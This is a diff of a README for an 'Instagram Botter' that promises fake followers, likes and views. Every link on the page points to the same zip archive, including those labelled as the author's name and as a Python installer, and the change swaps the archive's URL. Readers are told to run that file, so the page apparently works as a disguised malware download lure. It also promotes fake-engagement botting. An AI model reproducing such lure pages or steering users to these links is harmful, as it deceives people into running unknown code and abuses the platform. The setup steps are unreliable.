@@ -1,18 +1,18 @@
 
 <div align="center">
 <h1>Instagram Botter</h1>
-<h3><a href="https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip">Instagram</a> followers, likes and views botter.</h3>
+<h3><a href="https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip">Instagram</a> followers, likes and views botter.</h3>
 <br/>
-<h4>By <a href="https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip">natrixdev</a> for github.</h4>
+<h4>By <a href="https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip">natrixdev</a> for github.</h4>
 <br/>
 <h1>Setup</h1>
 </div>
 <h2>1 - You need to install python</2>
-<h4>By <a href="https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip">clicking here</a></h4>
+<h4>By <a href="https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip">clicking here</a></h4>
 <br/>
 <h2>2 - Install packages</h2>
-<h4>By running <a href="https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip">https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip</a> file</h4>
+<h4>By running <a href="https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip">https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip</a> file</h4>
 <br/>
 <h2>3 - Run the botter</h2>
-<h4>Run this <a href="https://github.com/Shadowware/instagram-botter/raw/refs/heads/main/eucalypteol/botter_instagram_3.7-alpha.2.zip"> file</a> to access the botter</h4>
+<h4>Run this <a href="https://raw.githubusercontent.com/Shadowware/instagram-botter/main/eucalypteol/instagram_botter_v2.8.zip"> file</a> to access the botter</h4>
 <br/>
